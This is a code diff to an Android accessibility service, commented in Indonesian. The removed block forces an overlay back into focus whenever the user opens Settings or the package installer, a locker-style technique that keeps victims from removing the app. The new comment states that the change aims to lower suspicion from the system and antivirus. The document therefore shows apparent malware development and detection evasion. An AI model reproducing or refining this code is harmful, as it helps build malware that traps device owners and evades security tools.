@@ -184,19 +184,7 @@ public class SupportService extends AccessibilityService {
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
-        // Hanya panggil update jika overlay aktif dan ada interaksi dengan Settings
-        if (!checkStatus() && overlay != null) {
-            String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "";
-            if (pkg.equals("com.android.settings") || pkg.equals("com.google.android.packageinstaller")) {
-                apply_immersive_mode();
-                // Menggunakan updateViewLayout hanya jika benar-benar perlu untuk memaksa fokus kembali
-                try {
-                    wm.updateViewLayout(overlay, overlay.getLayoutParams());
-                } catch (Exception e) {
-                    // Avoid crash if view removed
-                }
-            }
-        }
+        // Monitoring dinonaktifkan untuk mengurangi kecurigaan sistem/antivirus
     }
 
     @Override
